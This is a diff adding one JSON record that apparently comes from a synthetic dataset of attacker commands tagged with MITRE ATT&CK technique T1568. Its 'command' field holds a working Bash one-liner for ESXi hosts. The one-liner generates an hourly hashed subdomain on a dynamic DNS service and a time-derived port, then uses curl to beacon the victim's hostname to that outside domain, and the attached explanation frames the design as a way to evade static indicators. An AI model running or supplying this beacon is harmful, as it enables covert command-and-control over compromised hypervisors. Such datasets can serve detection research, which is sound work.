@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "ESXi",
+  "shell": "Bash",
+  "command": "seed=$(date -u +%Y%m%d%H); sub=$(printf \"%s\" \"$seed\" | sha1sum | cut -c1-12); port=$(( (10#$(date -u +%H%M) % 20000) + 10000 )); dom=\"$sub.dynu.net\"; curl --connect-timeout 5 -A \"esxi-$(uname -r)\" \"https://$dom:$port/beacon?host=$(hostname -s)&t=$(date -u +%s)\"",
+  "explanation": "Generates a time-based DGA subdomain each hour and selects a dynamic port derived from the current UTC time before attempting an HTTPS beacon via curl. This leverages dynamic resolution to avoid static IoCs per ATT&CK T1568.",
+  "rationale_steps": [
+    "Derive a seed from the current UTC year-month-day-hour.",
+    "Hash the seed to produce a rotating subdomain for a dynamic DNS provider.",
+    "Compute a port from current UTC time to vary C2 parameters.",
+    "Beacon with curl to the dynamically generated domain and port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-0d44a1cb-22d4ddc6",
+  "source_prompt_hash": "0d44a1cb",
+  "timestamp_utc": "2025-09-30T04:15:38.906305Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
